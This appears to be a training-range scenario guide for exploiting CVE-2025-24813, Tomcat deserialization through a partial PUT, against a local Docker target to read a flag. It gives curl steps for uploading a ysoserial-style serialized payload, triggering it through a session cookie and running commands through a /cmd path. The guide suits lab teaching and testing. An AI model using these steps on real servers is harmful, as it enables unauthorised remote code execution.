# WEB-01: Apache Tomcat Deserialization RCE

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-01 |
| 名称 | Apache Tomcat Deserialization RCE |
| 技术/CVE | CVE-2025-24813 |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10101 |

## 场景概述
- 技术：CVE-2025-24813
- 难度：L2
- 交付方式：docker
- 入口端口：10101
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-24813 (CVSS 9.8) |
| Difficulty | L2 |
| Port | 10101 |
| Path | scenarios/web/tomcat-deserialization |
| Image | tomcat:9.0.98-jdk11 |

### Attack Path
```
PUT partial session file → Deserialization via PersistentManager FileStore → RCE → read /opt/flag.txt
```

### Step-by-Step

```bash
# Probe: Tomcat 9.0.98 with read-only disabled
curl -s http://localhost:10101/ | grep -i tomcat

# Exploit: PUT serialized payload via partial PUT
# Using ysoserial or custom Java deserialization gadget
# commons-collections-3.2.1.jar is available

# Send payload
curl -X PUT http://localhost:10101/session -H "Content-Range: bytes 0-1000/1001" \
  --data-binary @payload.ser

# Trigger deserialization by accessing session
curl http://localhost:10101/ -H "Cookie: JSESSIONID=.XXXXX"

# Read flag
curl http://localhost:10101/cmd?c=cat+/opt/flag.txt
# flag{web-01-xxxxxxxxxxxxxxxx}
```

### Flag Location
- `/opt/flag.txt` inside Tomcat container
- Requires RCE through deserialization

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Tomcat HTTP service and HTTP PUT/session handling |
| 侦察与前置条件 | PersistentManager FileStore and writable partial PUT endpoint identification |
| 核心漏洞与利用 | Java deserialization payload delivery through a crafted session file |
| 权限、横向或影响 | Remote command execution in the Tomcat container |
| 验证 | Trigger the session and read /opt/flag.txt through the command path |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
